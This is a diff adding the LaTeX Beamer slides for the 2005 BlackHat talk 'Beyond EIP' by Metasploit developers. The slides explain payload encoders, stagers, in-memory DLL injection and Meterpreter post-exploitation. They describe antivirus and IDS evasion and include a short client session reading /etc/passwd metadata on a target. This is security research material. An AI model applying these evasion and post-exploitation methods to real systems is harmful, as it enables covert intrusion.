@@ -1,0 +1,1646 @@
+\documentclass{beamer}
+\usepackage{graphicx}
+\usepackage{color}
+
+\mode<presentation> { }
+
+\usepackage[english]{babel}
+\usepackage[latin1]{inputenc}
+\usepackage{times}
+\usepackage[T1]{fontenc}
+% I think this looks cool, but whateva! - skape
+%\usepackage{beamerthemeshadow}
+
+% Love from spoon
+\newcommand{\pdfpart}[1]{\label{pdfpart-#1}\pdfbookmark[0]{#1}{pdfpart-#1}\part{#1}}
+\newenvironment{sitemize}{\vspace{1mm}\begin{itemize}\itemsep 4pt\small}{\end{itemize}}
+\newenvironment{senumerate}{\vspace{1mm}\begin{enumerate}\itemsep 4pt\small}{\end{enumerate}}
+
+% Presentation meta-information
+\title{Beyond EIP}
+\author[spoonm \& skape] {spoonm \& skape}
+\date[BlackHat 2005] {BlackHat, 2005}
+\subject{Beyond EIP}
+
+% Add a spacer between each part
+\AtBeginPart{\frame{\partpage}}
+
+% Turn off the navigation on the bottom yo
+\setbeamertemplate{navigation symbols}{}
+% spoon hates berkeley!
+%\usetheme[width=2.2cm]{Berkeley}
+%\usecolortheme{sidebartab}
+
+\begin{document}
+
+\begin{frame}[t]
+  \titlepage
+\end{frame}
+
+
+%
+% Introduction
+%  - Who are we
+%  - Why are we here, what will we say
+%  - What order we're going to say it in
+%
+\pdfpart{Introduction}
+
+\begin{frame}[t]
+    \frametitle{Who are we?}
+
+    \begin{sitemize}
+        \item spoonm
+        \begin{sitemize}
+            \item Full-time student
+            \item Metasploit developer since late 2003
+        \end{sitemize}
+
+        \item skape
+        \begin{sitemize}
+            \item Lead software developer by day
+            \item Independent security researcher by night
+            \item Joined the Metasploit project in 2004
+        \item Responsible for all cool features
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{What's this presentation about?}
+    \begin{sitemize}
+        \item What it's not about
+        \begin{sitemize}
+        \item New exploit / attack vectors
+        \item New exploitation techniques
+        \item 0day, bugs, etc
+        \end{sitemize}
+    \pause
+    \item What it is about
+        \begin{sitemize}
+        \item What you can do after owning EIP
+        \item The techniques to do it
+        \item Our tools to support it
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+  \frametitle{Plan of attack}
+  \begin{sitemize}
+    \item Payload Infrastructure
+    \begin{sitemize}
+      \item Payload composition
+      \item How payloads work
+      \item Recent tools, tricks, and techniques
+    \end{sitemize}
+    \item Post-exploitation tools
+    \begin{sitemize}
+      \item Background \& review of existing tools
+      \item The technology behind our tools
+      \item How they can be used
+      \item Crazy cool features for the end-user
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Our definitions: the exploitation cycle}
+
+    \begin{sitemize}
+        \item \textbf{Pre-exploitation} - Before the attack
+        \begin{sitemize}
+            \item Find a bug, isolate, write exploit
+            \item Write any other tools, payloads, etc
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Exploitation} - Leveraging the vulnerability
+        \begin{sitemize}
+            \item Recon, information gathering, find target
+            \item Initialize tools and infrastructure
+            \item Launch the exploit
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Post-exploitation} - Manipulating the target
+        \begin{sitemize}
+            \item Arbitrary command execution
+            \item Command execute via shell
+            \item File access, VNC, pivoting, etc
+            \item Advanced payload interaction
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+%
+% This section is basically here to introduce them to all of the mechanisms
+% of a modern day payload system.  Just introduce and define the pieces, and
+% explain their roles.  Then, later, we will discuss the details of them..
+%
+% We should try hard not to introduce anything new in this section!, Any
+% examples in explainations
+%
+% This section should be an _introduction_ to what payload infrastructure is
+% but it should not have any specific details about our implementations.
+%
+% - What is a nop sled, and why / how / when  do we use them
+% - What is an encoder, and why / how / when do we use them
+% - What is a stager and stage, why / how / when do we use them
+%
+% We should also talk about egghunt, heapfix, jmpcode, etc.  We should have
+% a name for these sort of things, they are like "bootstrap" codes, or
+% something.  Like, we need a a good name for them dude!
+%
+\pdfpart{Payload Infrastructure}
+
+\begin{frame}[t]
+    \frametitle{Anatomy of a Payload}
+    \Large{[ \alert<1>{nops} ] [ \alert<2>{decoder} ( \alert<3>{encoded payload} ) ]}
+
+    \begin{sitemize}
+        \item \textbf{Nop sled}
+        \begin{sitemize}
+            \item For exploits where return is uncertain
+            \item Control flows through the sled into the encoder
+            \item Generally 1 byte aligned for x86
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Decoder}
+        \begin{sitemize}
+            \item Synonymous with payload encoder
+            \item Loops and decodes payload
+            \item Payload executed when finished
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Payload}
+        \begin{sitemize}
+            \item Arbitrary code
+            \item Typically provides a command shell
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\section{Nop sleds}
+
+%
+% Why do we use them?
+% Don't really need them for win32, why?
+% Previous work (0x90, admutate)
+
+\begin{frame}[t]
+    \frametitle{What's a nop sled?}
+
+    \textbf{Definition}
+    \begin{sitemize}
+        \item A series of bytes that equate to no-operations on the
+        target architecture
+    \end{sitemize}
+
+    \pause
+    \textbf{How a nop sled works}
+    \begin{sitemize}
+        \pause
+        \item Client builds a nop sled and prepends it to a payload
+        \pause
+        \item Client transmits the entire payload via an exploit
+        \pause
+        \item Target executes all, some, or none of the nop
+        instructions
+        \pause
+        \item Execution falls through to the payload
+    \end{sitemize}
+
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{What's so cool about nop sleds?}
+
+    \begin{sitemize}
+        \item Not all vulnerabilities have predictable return
+        addresses
+        \begin{sitemize}
+            \item Particularly useful when brute forcing
+        \end{sitemize}
+
+        \pause
+        \item Using a sled can improve exploit quality
+        \begin{sitemize}
+            \item Increasing the brute force step size decreases
+        number of attempts
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Nop sled technology}
+
+    \textbf{Existing technology}
+    \begin{sitemize}
+        \item \footnotesize{\texttt{perl -e 'print "$\backslash$x90" x \$ARGV[0]"'
+            sled\_size}}
+        \item ADMutate - single-byte x86
+    \end{sitemize}
+
+     \textbf{Metasploit technology}
+     \begin{sitemize}
+         \item Opty2 multi-byte sled generator
+          \item Based on Optyx's multi-byte sled generator
+     \end{sitemize}
+\end{frame}
+
+\section{Encoders}
+
+% Why, etc
+% Talk about any previous work?
+
+\begin{frame}[t]
+    \frametitle{What's an encoder?}
+
+    \textbf{Definition}
+    \begin{sitemize}
+        \item Algorithm to retain payload functionality, but alter the byte sequence
+    \end{sitemize}
+
+    \pause
+    \textbf{How an encoder works}
+    \begin{sitemize}
+        \pause
+        \item Client encodes the payload prior to transmission
+        \pause
+        \item Client prepends decoder stub to the payload
+        \pause
+        \item Client transmits the entire payload via an exploit
+        \pause
+        \item Target executes the decoder stub
+        \pause
+        \item Decoder stub performs inverse operation on the payload
+        \pause
+        \item Original payload is executed
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{What's so cool about encoders?}
+
+    \begin{sitemize}
+        \item Avoid common restricted characters
+            (\texttt{0x00}, \texttt{0x0a}, etc)
+    \item Survive application translations (unicode, toupper)
+
+        \pause
+        \item IDS evasion
+        \begin{sitemize}
+            \item Static string signatures
+            (\texttt{/bin/sh})
+            \item Specific payload and payload pattern signatures
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Encoder technology}
+
+    \textbf{Existing technology}
+    \begin{sitemize}
+        \item XOR
+        \begin{sitemize}
+            \item Defacto standard for encoders
+            \item Typically performed on a byte, word, or dword basis
+            \item Variable or static key
+            \item Decoder stubs are usually static excluding the key
+        \end{sitemize}
+
+        \pause
+        \item Alphanumeric / Unicode
+        \begin{sitemize}
+            \item Rix's x86 encoder from Phrack 57
+            \item SkyLined's Alpha2 x86 ascii and unicode encoder
+        \item Dave Aitel and FX's unicode encoders
+        \end{sitemize}
+    \end{sitemize}
+     \textbf{Metasploit technology}
+     \begin{sitemize}
+         \item Shikata Ga Nai
+     \end{sitemize}
+\end{frame}
+
+\section{Payloads}
+
+\begin{frame}[t]
+    \frametitle{What's a payload?}
+
+    \textbf{Definition}
+    \begin{sitemize}
+        \item Arbitrary code that is to be executed upon successful
+        exploitation
+    \end{sitemize}
+
+    \pause
+    \textbf{How a payload works}
+    \begin{sitemize}
+        \item Client prepares the payload for execution
+    \pause
+    \item Data may be embedded  (cmd to execute, hostname, port, etc)
+    \pause
+        \item Client transmits the payload via an exploit
+    \pause
+        \item Target executes the payload
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{The three types of payloads}
+
+    \begin{sitemize}
+        \item \textbf{Single}
+        \begin{sitemize}
+            \item A self-contained payload that performs a specific
+            task
+            \item Size varies depending on the task
+        \item Example: Reverse or bind command shell
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Stager}
+        \begin{sitemize}
+            \item A stub payload that loads / bootstraps a stage
+            \item Size generally much smaller than single payloads
+            \item Passes connection information onto the stage
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Stage}
+        \begin{sitemize}
+            \item Similar to a single payload, but takes advantage
+            of staging
+            \item Uses connection passed from the stager
+            \item Not subject to size limitations of individual
+            vulnerabilities
+        \item A stager can also be a stage
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\subsection{Single}
+
+\begin{frame}[t]
+    \frametitle{Single payloads}
+
+    \begin{sitemize}
+        \item Easy plug \& chug payloads
+
+        \pause
+        \item Task oriented and connection specific
+
+        \pause
+        \item Single payloads have to be developed for each
+            connection (portbind, reverse, findsock)
+        \begin{sitemize}
+            \item Requires the payload to be implemented \textit{N} times
+        \item Shellcode development systems tried to help with this
+        \end{sitemize}
+
+        \pause
+        \item Subject to size limitations of individual
+        vulnerabilities
+    \end{sitemize}
+\end{frame}
+
+% Previous work?
+% Explain singles/stagers/stages
+
+\subsection{Stagers}
+% What is a stager and why
+\begin{frame}[t]
+    \frametitle{Payload stagers}
+
+    \begin{sitemize}
+        \item Stagers are typically network based and follow three
+        basic steps
+        \begin{sitemize}
+            \item Establish connection to attacker (reverse,
+            portbind, findsock)
+            \item Read in a payload from the connection
+            \item Setup connection information and branch to stage
+        \end{sitemize}
+
+        \pause
+        \item The three steps make it so stages are independent of the
+    connection method
+        \begin{sitemize}
+            \item No need to have command shell payloads for
+            reverse, portbind, and findsock
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Why are payload stagers useful?}
+
+    \begin{sitemize}
+        \item Some vulnerabilities have limited space for the
+        initial payload
+
+        \item Typically much smaller than the stages
+        they execute
+
+        \pause
+        \item Eliminate the need to re-implement payloads for each
+        connection method
+
+        \pause
+    \item Provides an abstraction level for loading code onto a remote
+    machine through any medium
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Existing payload stager technology}
+
+    \begin{sitemize}
+        \item Standard reverse, portbind, and findsock stagers
+        included in Metasploit 2.2+
+
+    \item LSD Win32 Assembly Components
+
+    \item Found in public exploits (Solar Eclipse OpenSSL)
+
+        % TODO: others?
+    \end{sitemize}
+\end{frame}
+
+\subsection{Stages}
+% Command shell
+% or whatever
+\begin{frame}[t]
+    \frametitle{Payload stages}
+
+    \begin{sitemize}
+        \item Payload stages are executed by payload stagers and
+        perform arbitrary tasks
+
+        \pause
+        \item Some examples of payload stages include
+        \begin{sitemize}
+            \item Execute a command shell and redirect IO to the
+            attacker
+            \item Execute an arbitrary command (ex adduser)
+            \item Download an executable from a URL and execute it
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Why are payload stages useful?}
+
+    \begin{sitemize}
+        \item Highly reusable (connection independent, etc)
+    \item Can conform to some sort of ABI
+
+        \pause
+        \item Not subject to size limitations of individual
+        vulnerabilities
+    \item This means they can be arbitrarily complex
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{``Advantage'' payloads}
+
+    \begin{sitemize}
+    \item Shellcode generation systems
+        \item Generally have more features because they're easier to write
+    \item The system's infrastructure makes the payloads more capable
+        \item Help to reduce the tediousness of writing payloads
+
+    \pause
+
+    \item Stealth's Hellkit
+        \item Core ST's InlineEgg
+    \item Philippe's Shellforge
+    \item Dave Aitel's MOSDEF
+
+    \end{sitemize}
+\end{frame}
+
+\section{Windows Ordinal Stagers}
+
+\subsection{Overview}
+\begin{frame}[t]
+    \frametitle{Windows ordinal stagers}
+
+    \begin{sitemize}
+        \item Technique from Oded's lightning talk at core04
+        \item Uses static ordinals in \texttt{WS2\_32.DLL} to locate symbol
+        addresses
+        \item Compatible with all versions of Windows (including 9X)
+        \item Results in very low-overhead symbol resolution
+        \item Facilitates implementation of reverse, portbind, and
+        findsock stagers
+        \item Leads to very tiny win32 stagers (92 byte reverse, 93
+        byte findsock)
+        \item Detailed write-up can be found in reference materials
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{How ordinal stagers work}
+
+    \begin{sitemize}
+        \item Ordinals are unique numbers that identify exported
+        symbols in PE files
+        \item Each ordinal can be used to resolve the address of an
+        exported symbol
+
+        \pause
+        \item Most of the time, ordinals are incremented linearly by the
+        linker
+        \item Sometimes, however, developers may wish to force
+        symbols to use the same ordinal every build
+        \item When ordinals are the same every build, they are
+        referred to as static
+
+        \pause
+        \item Using an image's exports by ordinal instead of by name
+        is more efficient at runtime
+        \item However, it will not be reliably portable unless the
+        ordinals are known-static
+
+        \pause
+        \item Very few PE files use known-static ordinals, but
+        \texttt{WS2\_32.DLL} is one that does
+        \begin{sitemize}
+            \item 30 symbols use static ordinals in
+            \texttt{WS2\_32.DLL}
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Limitations of ordinal stagers}
+
+    \begin{sitemize}
+        \item Only 30 symbols can be used
+        \begin{sitemize}
+            \item \texttt{WSASocketA} is not among them
+        \end{sitemize}
+
+        \pause
+        \item Can't initialize winsock if it isn't initialized
+        \begin{sitemize}
+            \item \texttt{WSAStartup} doesn't have a static ordinal
+        \end{sitemize}
+
+        \pause
+        \item Can't use sockets as direct standard I/O handles
+        \begin{sitemize}
+            \item Sockets returned from \texttt{socket} aren't valid
+            console handles
+            \item Must use pipes instead
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\subsection{Implementation}
+\begin{frame}[t]
+    \frametitle{Implementing a reverse ordinal stager}
+
+    \begin{sitemize}
+        \item Locate the base address of \texttt{WS2\_32.DLL}
+        \begin{sitemize}
+            \item Extract the Peb->Ldr pointer
+            \item Extract Flink from the InInitOrderModuleList
+            \item Loop through loaded modules comparing module names
+            \item Module name is stored in unicode, but can be
+            partially translated to ANSI
+            \item Once \texttt{WS2\_32.DLL} is found, extract its
+            BaseAddress
+        \end{sitemize}
+
+        \pause
+        \item Resolve \texttt{socket}, \texttt{connect},
+        and \texttt{recv}
+        \begin{sitemize}
+            \item Use static ordinals to index the Export Directory Address Table
+        \end{sitemize}
+
+        \pause
+        \item Allocate a socket, connect to the attacker,
+        and read in the next payload
+
+        \pause
+        \item Requires that \texttt{WS2\_32.DLL} already be loaded
+        in the target process
+    \end{sitemize}
+
+\end{frame}
+
+\pdfpart{Post Exploitation}
+
+\section{Introduction}
+
+
+%
+%
+% NOTE, we should probably throw in some intermitent demos just
+% to help the audience from getting bored.  We should figure out how
+% we can demo some of the parts before Features, or if we should reord
+% some things so there are some demoables...
+%
+%
+
+%
+% Oh, I have a good idea, we should talk about dN in the introduction, since
+% it's a really simple example of post exploitation.  Then we'll demo that
+% and then go into the meterpreter stuff, and then demo that at the end!
+%
+
+%
+% What is post exploitation?
+%
+% Most important to audience
+% 1) Features
+% 2) Evasion
+% 3) Technology
+%
+% Presentation Order
+% 1) Technology (lib inject, etc)
+% 2) Evasion (diskless, encryption, http tuennling maybe)
+% 3) Features (and made demos)
+%
+% Maybe we shoud just merge Evasion into technology, there is no good
+% reason for them to be seperate, and it makes the explination more
+% continuious
+%
+
+\begin{frame}[t]
+    \frametitle{What is post-exploitation?}
+
+    \begin{sitemize}
+        \pause
+        \item The purpose of an exploit is to manipulate a target
+
+        \pause
+        \item Manipulation of a target begins in post-exploitation
+        \begin{sitemize}
+            \item Command shells are executed
+            \item Files are downloaded
+        \end{sitemize}
+
+        \pause
+        \item Represents the culmination of the exploitation cycle
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{What do most people do in post-exploitation?}
+
+    \begin{sitemize}
+        \item Most people spawn a command shell
+        \begin{sitemize}
+            \item Poor automation support
+            \item Reliant on the shell's intrinsic commands
+            \item Limited to installed applications
+            \item Can't provide advanced features
+        \end{sitemize}
+
+        \pause
+        \item Some people use syscall proxies
+        \begin{sitemize}
+            \item Good automation support
+            \item Partial or full access to target native API
+            \item Can be clumsy when implementing complex features
+            \item Typically require specialized build steps
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+%
+% Introduction - Dispatch Ninja
+%
+% Gentle introduction into post-exploitation with simple overview and a
+% demo about how dN works!
+%
+
+\section{DispatchNinja}
+\begin{frame}[t]
+    \frametitle{DispatchNinja - Caveman Post Exploitation}
+
+    \begin{sitemize}
+        \item The idea is to have interactive shellcode
+        \item And be able to keep a very low footprint
+        \pause
+        \item But also have lots of optional power
+
+        \pause
+        \
+        \item Basically a shellcode read-eval-print loop
+        \item First stage loops, reading/executing code
+        \item DispatchNinja "modules" are sent and executed
+        \item This is what we call "dispatching"
+
+        \pause
+        \
+
+        \item Modules are responsible for their own mini-protocols
+        \item Each module has a corresponding handler on client side
+
+        \pause
+        \
+
+        \item Modules have a simple C ABI, and have a main function
+        \item Most of our dN modules were written in C (shellforge)
+
+
+    \end{sitemize}
+\end{frame}
+
+
+\begin{frame}[t]
+    \frametitle{DispatchNinja - Client side APIs}
+
+    \begin{sitemize}
+        \item Client side APIs wrap handler and module code
+        \item Msf3 has ruby dN client side APIs
+
+        \pause
+        \
+        \item APIs modeled after the ruby APIs (Dir, File, etc)
+        \item Our APIs should support the majority of Ruby functionality
+
+    \end{sitemize}
+
+\end{frame}
+
+\begin{frame}[t, fragile]
+    \footnotesize{
+    \begin{verbatim}
+irb#1(main):001:0> c = @c
+=> #<Rex::Post::DispatchNinja::Client:0xb7bf542c
+   @sock=#<TCPSocket:0xb7bf5440>>
+irb#1(main):002:0> c.dir.entries('/tmp')
+=> [".", "..", ".X11-unix", ".ICE-unix", ".font-unix"]
+
+irb#1(main):004:0> puts c.file.stat('/etc/passwd').pretty
+  Size: 1036   Blocks: 8   IO Block: 4096   Type: 0
+Device: 774  Inode: 81499  Links: 1
+  Mode: 100644/rw-r--r--
+   Uid: 0  Gid: 0
+Access: Tue Jul 26 20:08:09 EDT 2005
+Modify: Wed Jul 06 20:45:04 EDT 2005
+Change: Wed Jul 06 20:45:04 EDT 2005
+=> nil
+
+irb#1(main):005:0> Process.pid
+=> 1496
+irb#1(main):006:0> c.process.pid
+=> 1498
+
+\end{verbatim}
+}
+
+\end{frame}
+
+%
+% Introduction - Meterpreter
+%
+% Now give an overview of meterpreter!
+%
+
+\begin{frame}[t]
+    \frametitle{What is Meterpreter?}
+
+    \begin{sitemize}
+        \item Short for \textit{Meta-Interpreter}
+        \item An advanced post-exploitation system
+        \item Based on library injection technology
+        \item First released with Metasploit 2.3
+        \item Detailed write-up can be found in reference materials
+    \end{sitemize}
+
+    \begin{sitemize}
+        \pause
+        \item After exploitation, a Meterpreter server DLL is
+        loaded on the target
+
+        \pause
+        \item Attackers use a Meterpreter client to interact with
+        the server to...
+        \begin{sitemize}
+            \item Load run-time extensions in the form of DLLs
+            \item Interact with communication channels
+        \end{sitemize}
+    \end{sitemize}
+    \begin{sitemize}
+        \pause
+        \item But before understanding Meterpreter, one should understand
+        library injection...
+
+    \end{sitemize}
+\end{frame}
+
+
+
+%
+% Technology - Library Injection
+%
+\section{Library Injection}
+
+\subsection{Overview}
+
+\begin{frame}[t]
+    \frametitle{Library injection}
+
+    \begin{sitemize}
+        \item Provides a method of loading a
+        library (DLL) into an exploited process
+
+        \pause
+        \item Libraries are functionally equivalent to executables
+        \begin{sitemize}
+            \item Full access to various OS-provided APIs
+            \item Can do anything an executable can do
+        \end{sitemize}
+
+        \pause
+        \item Library injection is covert; no new processes
+        need to be created
+
+        \pause
+        \item Detailed write-up can be found in reference materials
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Types of library injection}
+
+    \begin{sitemize}
+        \item Two primary methods exist to inject a library
+        \begin{senumerate}
+            \item \textbf{On-Disk}: loading a library from the target's
+            harddrive or a file share
+            \item \textbf{In-Memory}: loading a library entirely from memory
+        \end{senumerate}
+        \item Both are conceptually portable to non-Windows platforms
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{On-Disk library injection}
+
+    \begin{sitemize}
+        \item Loading a library from disk has been the defacto
+        standard for Windows payloads
+        \item Loading a library from a file share was first
+        discussed by Brett Moore
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item On-Disk injection is subject to filtering by Antivirus due to
+            filesystem access
+        \item Requires that the library file exist on the target's
+            harddrive or that the file share be reachable
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{In-Memory library injection}
+
+    \begin{sitemize}
+        \item First Windows implementation released with Metasploit 2.2
+
+        \pause
+        \item Libraries are loaded entirely from memory
+
+        \pause
+        \item No disk access means no Antivirus interference
+
+        \pause
+        \item Most stealthy form of library injection thus far
+        identified
+
+        \pause
+        \item No disk access means no forensic trace if the machine
+        loses power
+    \end{sitemize}
+\end{frame}
+
+\subsection{In-Memory Implementation on Windows}
+
+\begin{frame}[t]
+    \frametitle{In-Memory library injection on Windows}
+
+    \begin{sitemize}
+        \item Library loading on Windows is provided through \texttt{NTDLL.DLL}
+        \item \texttt{NTDLL.DLL} only supports loading libraries from disk
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item To load libraries from memory, \texttt{NTDLL.DLL} must be tricked
+
+        \pause
+        \item When loading libraries, low-level system calls are used to interact with the file on disk
+        \begin{sitemize}
+            \item \texttt{NtOpenFile}
+            \item \texttt{NtCreateSection}
+            \item \texttt{NtMapViewOfSection}
+        \end{sitemize}
+        \item These routines can be hooked to change their behavior to operate against a memory region
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item Once hooked, calling \texttt{LoadLibraryA} with a unique pseudo file name is all that's needed
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{In-Memory library injection on Windows}
+
+    \begin{sitemize}
+        \item But why not just write a stub loader instead of using
+        \texttt{NTDLL.DLL}?
+    \end{sitemize}
+
+    \begin{sitemize}
+        \pause
+        \item Lots of reasons...
+        \begin{sitemize}
+            \item Requires manual import processing
+            \item Requires manual relocation fix-ups
+            \item Requires loading dependent DLLs
+            \item May require manual insertion into the loaded module
+            lists
+            \item Other uncommon PE features that wouldn't
+            be supported
+        \end{sitemize}
+
+        \pause
+        \item No compelling reason to re-implement what is already
+        supplied in \texttt{NTDLL.DLL}
+    \end{sitemize}
+\end{frame}
+
+%
+% We've demo'd this before, so even though it would be a great demo, at
+% a perfect place in the talk, I don't think we should demo it
+%
+
+\subsection{Example DLL: VNC}
+
+\begin{frame}[t]
+    \frametitle{Library injection in action: VNC}
+
+    \begin{sitemize}
+        \item VNC is a remote desktop protocol
+        \item Very useful for remote administration beyond simple CLIs
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item First demonstrated at BlackHat USA 2004
+
+        \pause
+        \item Metasploit team converted RealVNC to a standalone DLL
+        \begin{sitemize}
+            \item No non-standard file dependencies
+            \item No installation required
+            \item Does not make any registry or filesystem changes
+            \item Does not listen on a port; uses payload connection as a VNC client
+        \end{sitemize}
+
+        \pause
+        \item By using the generic library loading stager, VNC was simply plugged in
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item Extremely useful when illustrating security weaknesses
+        \item Suits understand mouse movement much better than command lines
+    \end{sitemize}
+\end{frame}
+% more slides here, talking about post-exploitation technology
+% why it's necessary
+%   - automation
+%   - evasion
+%   - extensibility
+% what advantages it offers
+%   - pivoting
+%   - etc
+% other stuff I can't think of right now
+
+%
+% Technology - TLV / Protocol
+%
+
+%
+% We should also probably talk about it's asynchness and how that
+% works great for sharing and threading!
+%
+\section{Meterpreter}
+
+\begin{frame}[t]
+    \frametitle{Meterpreter: Design goals}
+
+    \begin{sitemize}
+        \item Primary design goals are to be...
+        \begin{sitemize}
+            \pause
+            \item \textbf{Stealthy}: no disk access and no new process by default
+            \pause
+            \item \textbf{Powerful}: channelized communication and robust protocol
+            \pause
+            \item \textbf{Extensible}: run-time augmentation of features with extensions
+        \end{sitemize}
+
+        \pause
+        \item Portability also a design consideration
+        \begin{sitemize}
+            \item The current server implementation is only for
+            Windows
+        \end{sitemize}
+    \end{sitemize}
+
+\end{frame}
+
+\subsection{Architecture}
+
+\begin{frame}[t]
+    \frametitle{Architecture - design goals}
+
+    \begin{sitemize}
+        \item Very flexible protocol; should adapt to extension
+        requirements without modification
+
+        \pause
+        \item Should expose a channelized communication system for
+        extensions
+
+        \pause
+        \item Should be as stealthy as possible
+
+        \pause
+        \item Should be portable to various platforms
+
+        \pause
+        \item Clients on one platform should work with servers on
+        another
+
+        \pause
+        \item All non-critical features should be implemented by
+        extensions
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Architecture - protocol}
+
+    \begin{sitemize}
+        \item Uses TLV (\texttt{Type-Length-Value}) to support
+        opaque data
+
+        \pause
+        \item Every packet is composed of zero or more TLVs
+
+        \pause
+        \item Packets themselves are TLVs
+        \begin{sitemize}
+            \item Type is the packet type (request, response)
+            \item Length is the length of the packet
+            \item Value is zero or more embedded TLVs
+        \end{sitemize}
+
+        \pause
+        \item TLVs make packet parsing simplistic and flexible
+        \begin{sitemize}
+            \item No formatting knowledge is required to parse the
+            packet outside of the TLV structure
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+%
+% Technology - Clients / Ruby APIs
+%
+
+\begin{frame}[t]
+    \frametitle{Core client/server interface}
+
+    \begin{sitemize}
+        \item Server written in C, client written in any language
+
+        \pause
+        \item Provides a minimal interface to support the loading of extensions
+
+        \pause
+        \item Implements basic packet transmission and dispatching
+        \item Exposes channel allocation and management to
+        extensions
+
+        \pause
+        \item Also includes support for migrating the server to
+        another running process
+    \end{sitemize}
+
+    \pause
+    \begin{sitemize}
+        \item Metasploit 2.x has a perl Meterpreter client
+        \item Metasploit 3.x will use a ruby Meterpreter client
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Augmenting features at run-time}
+
+    \begin{sitemize}
+        \item Adding new features is as simple as loading a DLL on
+        the server
+        \begin{sitemize}
+            \item Client uploads the extension DLL
+            \item Server loads the DLL from memory and
+            initializes it
+        \end{sitemize}
+
+        \pause
+        \item Client can begin sending commands for the new
+        extension
+    \end{sitemize}
+\end{frame}
+
+\subsection{Example Extension: Stdapi}
+
+\begin{frame}[t]
+    \frametitle{Meterpreter extensions in action: Stdapi}
+
+    \begin{sitemize}
+        \item Included in Metasploit 3.0
+        \item Combination of previous extensions into standard
+        interface
+
+        \pause
+        \item Provides access to standard OS features
+
+        \pause
+        \item Feature set provides for robust client-side automation
+
+        \pause
+        \item Designed to mirror the Ruby API to make it easy to use
+        existing scripts against targets
+    \end{sitemize}
+\end{frame}
+
+%
+% Features - Meterpreter
+%
+
+\begin{frame}[t]
+    \frametitle{Why is Meterpreter useful?}
+
+    \begin{sitemize}
+        \item Standard interface makes it possible to use one client
+        to perform common actions on various platforms
+        \begin{sitemize}
+            \pause
+            \item Execute a command interpreter and channelize the
+            output
+
+            \pause
+            \item Turn on the target's USB webcam and begin
+            streaming video
+        \end{sitemize}
+
+        \pause
+        \item Programmatically automatable
+        \begin{sitemize}
+            \item RPC-like protocol allows arbitrarily complex tasks
+            to be performed with a common interface
+            \item Extension-based architecture makes Meterpreter
+            completely flexible
+        \end{sitemize}
+
+        \pause
+        \item Use of in-memory library injection makes it possible
+        to run in a stealth fashion
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Some of the features Meterpreter can offer}
+
+    \begin{sitemize}
+        \item Command execution \& manipulation
+        \item Registry interaction
+        \item File system interaction
+        \item Network pivoting \& port forwarding
+        \item Complete native API proxying
+        \item Anything you can do as a native DLL, Meterpreter can
+        do!
+        \item Sky's the limit!
+    \end{sitemize}
+\end{frame}
+
+%
+% But enough talk, let's get to the demos!
+%
+
+\pdfpart{Demos}
+
+%
+% Now talk about all the crazy cool features and demo shit here!
+%
+% - port forwarding
+% - migrating
+% - file access
+% - clear event log or something silly
+% - opengl demo (in memory .exe loading)
+% - etc etc!
+%
+
+\pdfpart{Conclusion}
+
+\begin{frame}[t]
+    \frametitle{What does the future hold?}
+
+    \begin{sitemize}
+        \item Exploitation vectors and techniques are mature
+
+        \pause
+        \item Public post-exploitation suites still very weak
+
+        \pause
+        \item However, post-exploitation is maturing
+
+          \pause
+        \item Metasploit 3.0 should be cool
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Reference Material}
+
+    \textbf{Payload Stagers}
+    \begin{sitemize}
+%        \item Windows Ordinal Stagers \\
+%        \footnotesize{\url{http://www.metasploit.com/users/spoonm/ordinals.txt}}
+        \item PassiveX \\
+        \footnotesize{\url{http://www.uninformed.org/?v=1&a=3&t=sumry}}
+    \end{sitemize}
+    \textbf{Payload Stages}
+    \begin{sitemize}
+        \item Library Injection \\
